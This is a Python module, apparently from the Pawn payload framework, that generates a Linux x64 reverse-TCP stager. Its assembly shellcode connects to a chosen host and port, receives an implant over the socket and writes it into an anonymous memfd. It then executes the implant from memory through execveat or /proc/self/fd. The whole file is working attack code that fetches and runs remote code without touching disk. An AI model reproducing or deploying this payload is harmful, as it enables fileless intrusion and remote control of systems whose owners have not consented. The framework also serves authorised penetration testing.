"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from textwrap import dedent

from pex.assembler import Assembler

from pawn.lib.module import *


class PawnModule(Module, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "linux/x64/reverse_tcp_memfd",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
                'Tomas Globis (Tomasglgg) - payload developer'
            ],
            'Arch': "x64",
            'Platform': "linux",
            'Type': "reverse_tcp",
        })

        self.host = IPv4Option(None, 'Host to connect to.', True)
        self.port = PortOption(None, 'Port to connect to.', True)

        self.length = IntegerOption(None, 'Length of the implant.', False)

        self.reliable = BooleanOption('yes', 'Make payload reliable.', True)
        self.obsolete = BooleanOption('no', 'Use obsolete method (no execveat).', True)

    def run(self):
        payload = dedent(f"""\
        start:
            push 0x29
            pop  rax
            cdq
            push 0x2
            pop  rdi
            push 0x1
            pop  rsi
            syscall

            xchg   rdi, rax
            movabs rcx, 0x{self.host.little.hex()}{self.port.little.hex()}0002
            push   rcx
            mov    rsi, rsp
            push   0x10
            pop    rdx
            push   0x2a
            pop    rax
            syscall

            pop rcx
        """)

        if self.length.value:
            payload += dedent(f"""\
                push {hex(self.length.value)}
            """)

        else:
            payload += dedent(f"""\
                push 0x8
                pop  rdx
                push 0x0
                lea  rsi, [rsp]
                xor  rax, rax
                syscall
            """)

            if self.reliable.value:
                payload += dedent(f"""\
                    test rax, rax
                    js   fail
                """)

        payload += dedent("""\
            pop  r12
            push rdi
            pop  r13

            xor  rax, rax
            push rax
            push rsp
            sub  rsp, 8
            mov  rdi, rsp
            push 0x13f
            pop  rax
            xor  rsi, rsi
            syscall

            push rax
            pop  r14

            push 0x9
            pop  rax
            xor  rdi, rdi
            push r12
            pop  rsi
            push 0x7
            pop  rdx
            xor  r9, r9
            push 0x22
            pop  r10
            syscall

            push rax
            pop  r15
        """)

        if self.reliable.value:
            payload += dedent(f"""\
                test rax, rax
                js   fail
            """)

        payload += dedent(f"""\
            push 0x2d
            pop  rax
            push r13
            pop  rdi
            push r15
            pop  rsi
            push r12
            pop  rdx
            push 0x100
            pop  r10
            syscall

            push 0x1
            pop  rax
            push r14
            pop  rdi
            push r12
            pop  rdx
            syscall
        """)

        if self.obsolete.value:
            payload += dedent("""\
                add rsp, 16
                mov qword ptr [rsp], 0x6f72702f
                mov qword ptr [rsp+4], 0x65732f63
                mov qword ptr [rsp+8], 0x662f666c
                mov qword ptr [rsp+12], 0x002f64

                push r14
                pop  rax
                lea  rbx, [rsp+14]
                push 10
                pop  rcx
                xor  rdi, rdi
                push rax
                pop  rsi

            number_len_loop:
                xor  rdx, rdx
                div  rcx
                inc  rdi
                test rax, rax
                jnz  number_len_loop

                push rsi
                pop  rax
                dec  rdi

            convert_loop:
                xor  dx, dx
                div  rcx
                add  dx, 48
                or   [rbx+rdi], dx
                dec  rdi
                test rax, rax
                jnz  convert_loop

            execute:
                push 0x3b
                pop  rax
                push rsp
                pop  rdi
                xor  rdx, rdx
                push rdx
                push rdi
                mov  rsi, rsp
                syscall
            """)
        else:
            payload += dedent("""\
            execute:
                push 0x142
                pop  rax
                push r14
                pop  rdi
                push rsp
                sub  rsp, 8
                mov  rsi, rsp
                xor  r10, r10
                xor  rdx, rdx
                push 0x1000
                pop  r8
                syscall
            """)

        if self.reliable.value:
            payload += dedent("""\
            fail:
                push 0x3c
                pop  rax
                xor  rdi, rdi
                syscall
            """)

        return self.assemble(
            self.details['Arch'], payload)
